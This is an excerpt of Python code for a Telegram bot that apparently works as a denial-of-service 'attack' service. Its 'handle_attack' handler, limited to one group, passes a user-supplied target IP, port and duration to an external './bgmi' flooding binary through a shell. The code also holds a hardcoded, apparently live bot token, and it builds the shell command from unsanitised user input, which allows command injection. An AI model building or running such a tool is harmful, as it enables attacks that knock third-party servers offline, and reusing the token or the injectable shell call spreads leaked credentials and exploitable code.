...
# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7965886445:AAFSrvFuUfSRDNml7cE-3o_v15Hj6WoU97c')
...
def handle_attack(message):
    ...
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 𝗬𝗘𝗛𝗔 𝗡𝗔𝗛𝗜 𝗖𝗛𝗔𝗟𝗘𝗚𝗔 𝗕𝗥𝗢 𝗠𝗔𝗙𝗜𝗔 𝗞𝗔 𝗚𝗥𝗢𝗨𝗣 𝗝𝗢𝗜𝗡 𝗞𝗥! ❌")
        return
    ...
    # Attack Execution
    try:
        subprocess.run(f"./bgmi {target} {port} {time_duration} 1300", shell=True, check=True, timeout=time_duration)
